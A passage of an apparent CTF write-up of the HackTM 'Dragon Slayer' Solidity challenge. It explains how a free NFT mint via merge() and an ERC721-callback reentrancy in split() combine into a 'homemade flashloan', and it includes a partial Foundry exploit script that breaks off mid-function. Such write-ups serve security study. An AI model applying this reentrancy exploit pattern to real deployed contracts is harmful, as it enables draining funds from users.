</span></span><span class=line><span class=cl>        require<span class=o>(</span>bankNote.ownerOf<span class=o>(</span>bankNoteIdFrom<span class=o>)</span> <span class=o>==</span> msg.sender, <span class=s2>&#34;NOT_OWNER&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span>uint <span class=nv>i</span> <span class=o>=</span> 0<span class=p>;</span> i &lt; amounts.length<span class=p>;</span> i++<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            uint <span class=nv>value</span> <span class=o>=</span> amounts<span class=o>[</span>i<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            _ids.increment<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            uint <span class=nv>bankNoteId</span> <span class=o>=</span> _ids.current<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            bankNote.mint<span class=o>(</span>msg.sender, bankNoteId<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> <span class=o>=</span> value<span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>totalValue</span> <span class=o>+=</span> value<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        require<span class=o>(</span><span class=nv>totalValue</span> <span class=o>==</span> bankNoteValues<span class=o>[</span>bankNoteIdFrom<span class=o>]</span>, <span class=s2>&#34;NOT_ENOUGH&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNote.burn<span class=o>(</span>bankNoteIdFrom<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteIdFrom<span class=o>]</span> <span class=o>=</span> 0<span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> transferPartial<span class=o>(</span>uint bankNoteIdFrom, uint amount, uint bankNoteIdTo<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        require<span class=o>(</span>bankNote.ownerOf<span class=o>(</span>bankNoteIdFrom<span class=o>)</span> <span class=o>==</span> msg.sender, <span class=s2>&#34;NOT_OWNER&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        require<span class=o>(</span>bankNoteValues<span class=o>[</span>bankNoteIdFrom<span class=o>]</span> &gt;<span class=o>=</span> amount, <span class=s2>&#34;NOT_ENOUGH&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteIdFrom<span class=o>]</span> -<span class=o>=</span> amount<span class=p>;</span>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteIdTo<span class=o>]</span> +<span class=o>=</span> amount<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> transferPartialBatch<span class=o>(</span>uint<span class=o>[]</span> memory bankNoteIdsFrom, uint<span class=o>[]</span> memory amounts, uint bankNoteIdTo<span class=o>)</span> external <span class=o>{</span>
</span></span><span class=line><span class=cl>        uint totalValue<span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=o>(</span>uint <span class=nv>i</span> <span class=o>=</span> 0<span class=p>;</span> i &lt; bankNoteIdsFrom.length<span class=p>;</span> i++<span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            uint <span class=nv>bankNoteId</span> <span class=o>=</span> bankNoteIdsFrom<span class=o>[</span>i<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            uint <span class=nv>value</span> <span class=o>=</span> amounts<span class=o>[</span>i<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            require<span class=o>(</span>bankNote.ownerOf<span class=o>(</span>bankNoteId<span class=o>)</span> <span class=o>==</span> msg.sender, <span class=s2>&#34;NOT_OWNER&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            require<span class=o>(</span>bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> &gt;<span class=o>=</span> value, <span class=s2>&#34;NOT_ENOUGH&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            bankNoteValues<span class=o>[</span>bankNoteId<span class=o>]</span> -<span class=o>=</span> value<span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        bankNoteValues<span class=o>[</span>bankNoteIdTo<span class=o>]</span> +<span class=o>=</span> totalValue<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The <code>bank</code> contract can <strong>mint</strong> <code>GoldCoin</code> to the <code>msg.sender</code> . (This a real central bank here üëã¬†<strong>CBDC</strong>).</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%207.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%207.png data-sub-html="<h2>Withdraw() with `mint()` function.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%207.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%207.png, /posts/hacktm-dragon-slayer/Untitled%207.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%207.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%207.png width=1132 height=310></a><figcaption class=image-caption>Withdraw() with `mint()` function.</figcaption></figure></p><p>After a quick analysis, the <code>Bank</code> has <strong>no reentrancy guard implemented</strong>‚Ä¶ There is multiples <code>mint()</code> actually (3 mints in the contract):
We know that the mint() can lead to reeantrancy with <code>ERC721</code>. So we will looks potentials interested functions:</p><ul><li><p>split() ‚áí Using ERC721 ‚ö†Ô∏è (<code>BankNote</code> is an <em>ERC721</em>) ‚ö†Ô∏è</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%208.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%208.png data-sub-html="<h2>Split() with `mint()` function.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%208.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%208.png, /posts/hacktm-dragon-slayer/Untitled%208.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%208.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%208.png width=1186 height=718></a><figcaption class=image-caption>Split() with `mint()` function.</figcaption></figure></p></li><li><p>merge() ‚áí This is one is ERC721 ‚ö†Ô∏è (<code>BankNote</code> is an <em>ERC721</em>) ‚ö†Ô∏è</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%209.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%209.png data-sub-html="<h2>Merge() with `mint()` function.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%209.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%209.png, /posts/hacktm-dragon-slayer/Untitled%209.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%209.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%209.png width=1214 height=660></a><figcaption class=image-caption>Merge() with `mint()` function.</figcaption></figure></p></li><li><p><code>withdraw()</code> ‚áí Is using ERC20 so this is safe to use no need to check here.</p></li></ul><p>Using <code>ERC721</code> or <code>ERC1155</code> we have to be extremely careful with the <code>mint()</code> because this will <strong>callback</strong> the <strong>safemint</strong> function (so <code>.mint()</code> ‚û°Ô∏è¬†<code>_safemint()</code> and a has the <strong>callback</strong> on <code>onERC721Received</code> that can lead to reentrancy).</p><h3 id=5-homemade-flashloan>5. Homemade Flashloan</h3><p>Now, if we are looking closely the function <code>split()</code> we can make create a ‚Äúflashloan‚Äù using a reentrancy! (But we have to be an holder of a <code>bankNote</code> to do that explain later on).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=nb>require</span><span class=p>(</span><span class=n>bankNote</span><span class=p>.</span><span class=n>ownerOf</span><span class=p>(</span><span class=n>bankNoteIdFrom</span><span class=p>)</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;NOT_OWNER&#34;</span><span class=p>);</span><span class=c1>//This will check if you are owner of the bankNoteIdFrom 
</span></span></span></code></pre></td></tr></table></div></div><p>Let‚Äôs explain what is going on here:</p><p>Because the function <code>split()</code> permits to mint a value to <code>msg.sender</code>.</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%2010.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%2010.png data-sub-html="<h2>Split() flashloan using reantrancy.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%2010.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%2010.png, /posts/hacktm-dragon-slayer/Untitled%2010.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%2010.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%2010.png width=1404 height=746></a><figcaption class=image-caption>Split() flashloan using reantrancy.</figcaption></figure></p><ol><li><p>The <em>amounts</em> is a <code>uint[]</code> this will be the amount to flashloan. Here, <code>[2_000_000,0]</code> should do the flashloan for us.</p></li><li><p>Then the value will be the amount of index so for the index(0) ‚áí <em>2_000_000</em>.</p></li><li><p>‚ö†Ô∏è¬†The contract will mint a <em>bankNote</em> associate with the value and jump into the <code>onERC721Received</code> of the contract using the callback.</p></li><li><p>The value of <em>2_000_000</em> is set inside the <code>BankNotesValues[]</code>.</p></li><li><p>Don‚Äôt forget we have to sendback the money back otherwise this will revert <strong>at the end.</strong></p></li><li><p>Call the function <code>withdraw()</code> below, with <code>bankNoteId</code> of the <strong>step 3</strong> this will mint the value of the tokens previously written in the <strong>step 4.</strong></p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png title="CleanShot 2023-02-19 at 21.32.23@2x.png" data-thumbnail=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png data-sub-html="<h2>withdraw() function that mint goldCoin.</h2><p>CleanShot 2023-02-19 at 21.32.23@2x.png</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png data-srcset="/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png, /posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png 1.5x, /posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_21.32.232x.png width=1122 height=294></a><figcaption class=image-caption>withdraw() function that mint goldCoin.</figcaption></figure></p><p>And we will receive the money! That‚Äôs exactly what we are looking for! This will finally help us to <em>buy some stuffs to kill this damn dragon!</em></p></li></ol><p>Also we have to keep in mind to have a array of length <strong>‚â• 2</strong>.</p><table><thead><tr><th>index</th><th>Value</th></tr></thead><tbody><tr><td>uint[0]</td><td>2_000_000</td></tr><tr><td>uint[1]</td><td>0</td></tr></tbody></table><p>If we are using a length of 1, then this will jump into the <code>onERC721Received</code> of the contract using the callback but <strong>without updating</strong> the <code>BankNotesValues[]</code> and then we won‚Äôt be able to call the function <code>withdraw()</code> (who burn the banknotes and mint the money).</p><hr><h3 id=6-be-the-owner-of-an-nft>6. Be the owner of an NFT</h3><p>As we previously speak, to trigger the flashloan and generate the money (to buy a powerful <em>SWORD</em> & <em>SHIELD</em>) we have to bypass this check by holding an NFT‚Ä¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=nb>require</span><span class=p>(</span><span class=n>bankNote</span><span class=p>.</span><span class=n>ownerOf</span><span class=p>(</span><span class=n>bankNoteIdFrom</span><span class=p>)</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=s>&#34;NOT_OWNER&#34;</span><span class=p>);</span><span class=c1>//This will check if you are owner of the bankNoteIdFrom 
</span></span></span></code></pre></td></tr></table></div></div><p>Here, this is kind of a <strong>jail</strong> for the ERC721(bankNote) / ERC20(goldCoin) you cannot transfer them outside the authorized contracts of the ecosystem (if we look there is no features to transfer to another contract <em>damn it</em>!!) . I was stuck here‚Ä¶ But actually there is another vulnerability into the <code>bank</code> contract that can lead to the minting of the ERC721 into the function <code>merge()</code> of a external contract.</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%2011.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%2011.png data-sub-html="<h2>Merge function can bypass if the size is 0 and free mint.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%2011.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%2011.png, /posts/hacktm-dragon-slayer/Untitled%2011.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%2011.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%2011.png width=1430 height=662></a><figcaption class=image-caption>Merge function can bypass if the size is 0 and free mint.</figcaption></figure></p><ol><li>Bypass the for statement that contains the check on the <code>msg.sender</code> (that will revert) using the size of <code>bankNoteIdsFrom</code> = 0 (empty tab).</li><li>Increment the NFT id to <code>mint()</code>.</li><li>Then mint the NFT id from the <strong>step 2</strong> (with the <code>ids.increment()</code>).</li><li>Update the value of <code>bankNoteValues[]</code> with 0 (not really important).</li></ol><p>We finally succeed to mint an NFT! The fact that the banknotes will be set to <strong>0</strong> is not important here as we only want to have the NFT to trigger the reantrancy into the flashloan trick üè¥‚Äç‚ò†Ô∏è</p><h2 id=final-step>Final Step</h2><p>So this the final steps to produce the attack and kill this dragon:</p><ol><li>Mint an NFT using <code>merge()</code>.</li><li>Flashloan 2_000_000 GoldCoin using our homemade flashloan using <code>split()</code>.</li><li>Sending the money to the knight contract.</li><li>Buying the 2 super items using <code>buyItem(*4*)</code> & <code>buyItem(3)</code><ol><li>Abyssal Whip (<strong>SWORD</strong>)</li><li>Dragonfire Shield (<strong>SHIELD</strong>)</li></ol></li><li>Equip the new items (Abyssal Whip, Dragonfire Shield) using <code>equipItem(3)</code> & <code>equipItem(4)</code>.</li><li>Fight the Dragon x2 times (because the dragon has Health + Shield) through <code>fightDragon()</code>.</li><li>After killing the dragon, we can sell our items via (<code>sellItem(*3*)</code> & <code>sellItem(4)</code>) to get back our 2_000_000 Goldcoins.</li><li>Deposit our money back to the bank using <code>bankDeposit(*2_000_000* ether)</code>.</li><li>Last but not least, we have to transfer the money to correct <code>bankNoteValues[ID]</code><ul><li><p>If we have borrowed at the <code>id = 1</code> we must transfer the money to the <code>bankNoteValues[1]</code> to ensure this require will not fail otherwise the value won‚Äôt be to correct BankNotes.</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/Untitled%2012.png title=Untitled data-thumbnail=/posts/hacktm-dragon-slayer/Untitled%2012.png data-sub-html="<h2>BankNoteIdFrom have to set accordingly with the borrowed `ID`.</h2><p>Untitled</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/Untitled%2012.png data-srcset="/posts/hacktm-dragon-slayer/Untitled%2012.png, /posts/hacktm-dragon-slayer/Untitled%2012.png 1.5x, /posts/hacktm-dragon-slayer/Untitled%2012.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/Untitled%2012.png width=1118 height=162></a><figcaption class=image-caption>BankNoteIdFrom have to set accordingly with the borrowed `ID`.</figcaption></figure></p></li><li><p>To do this, we can use the function <code>transferPartial()</code> that will switch the <code>id</code> to the wanted one!</p><p><figure><a class=lightgallery href=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png title="CleanShot 2023-02-19 at 22.25.46@2x.png" data-thumbnail=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png data-sub-html="<h2>TransferPartial can be use to move BankNotes to another `id`.</h2><p>CleanShot 2023-02-19 at 22.25.46@2x.png</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png data-srcset="/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png, /posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png 1.5x, /posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png 2x" data-sizes=auto alt=/posts/hacktm-dragon-slayer/CleanShot_2023-02-19_at_22.25.462x.png width=1530 height=294></a><figcaption class=image-caption>TransferPartial can be use to move BankNotes to another `id`.</figcaption></figure></p></li></ul></li></ol><p>Voilaaaa! What a nice challenge from 0xKasper didn‚Äôt have the time to dive into the CTF‚Ä¶ But this will obviously give some new idea of challenges for <a href=https://ctf.mevsec.com// target=_blank rel="noopener noreffer">ctf.mevsec.com</a></p><h2 id=socials--payload>Socials & Payload</h2><table><thead><tr><th>Discord (Join us!)</th><th>Github</th><th>Twitter</th></tr></thead><tbody><tr><td><a href=https://discord.gg/54Q9pnpQcV target=_blank rel="noopener noreffer">https://discord.gg/54Q9pnpQcV</a></td><td><a href=https://github.com/Ethnical/Swek3 target=_blank rel="noopener noreffer">https://github.com/Ethnical/Swek3</a></td><td><a href=https://twitter.com/EthnicalInfo target=_blank rel="noopener noreffer">https://twitter.com/EthnicalInfo</a></td></tr></tbody></table><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Script.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;src/Setup.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>PoC</span> <span class=k>is</span> <span class=n>Script</span><span class=p>,</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>internal</span> <span class=n>increment</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Setup</span> <span class=n>S</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Setup</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Knight</span> <span class=n>K</span> <span class=o>=</span> <span class=n>Knight</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=n>Dragon</span> <span class=n>D</span> <span class=o>=</span> <span class=n>Dragon</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>().</span><span class=n>dragon</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=n>GoldCoin</span> <span class=n>G</span> <span class=o>=</span> <span class=n>GoldCoin</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>().</span><span class=n>goldCoin</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=n>Shop</span> <span class=n>Sh</span> <span class=o>=</span> <span class=n>Shop</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>().</span><span class=n>shop</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=n>Bank</span> <span class=n>B</span> <span class=o>=</span> <span class=n>Bank</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>().</span><span class=n>bank</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=n>Item</span> <span class=n>I</span> <span class=o>=</span> <span class=n>Item</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>().</span><span class=n>item</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>setUp</span><span class=p>()</span> <span class=k>public</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>run</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>S</span><span class=p>.</span><span class=n>claim</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_address</span><span class=p>(</span><span class=s>&#34;The Knight address&#34;</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=n>S</span><span class=p>.</span><span class=n>knight</span><span class=p>()));</span>
</span></span><span class=line><span class=cl>        <span class=c1>//emit log_named_uint(&#34;The Knight is alive&#34;, K.health() &gt; 0);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Health of the knight&#34;</span><span class=p>,</span> <span class=n>K</span><span class=p>.</span><span class=n>health</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Health of the Dragon&#34;</span><span class=p>,</span> <span class=n>D</span><span class=p>.</span><span class=n>health</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;The number of gold piece of BANK&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>G</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>B</span><span class=p>))</span> <span class=o>/</span> <span class=mi>1</span> <span class=kc>ether</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;The number of gold piece&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>G</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>K</span><span class=p>))</span> <span class=o>/</span> <span class=mi>1</span> <span class=kc>ether</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>bankNoteIdsFrom</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>uint</span><span class=p>[](</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>amounts</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>uint</span><span class=p>[](</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>bankNoteIdsFrom</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>amounts</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>uint</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>accounts</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>uint</span><span class=p>[](</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span><span class=p>.</span><span class=n>merge</span><span class=p>(</span><span class=n>accounts</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>split_amount</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>uint</span><span class=p>[](</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>split_amount</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2</span><span class=n>_000_000</span> <span class=o>*</span> <span class=mi>1</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>split_amount</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>B</span><span class=p>.</span><span class=n>split</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>split_amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>onERC721Received</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes</span> <span class=n>calldata</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>increment</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>increment</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nb>this</span><span class=p>.</span><span class=n>onERC721Received</span><span class=p>.</span><span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>increment</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
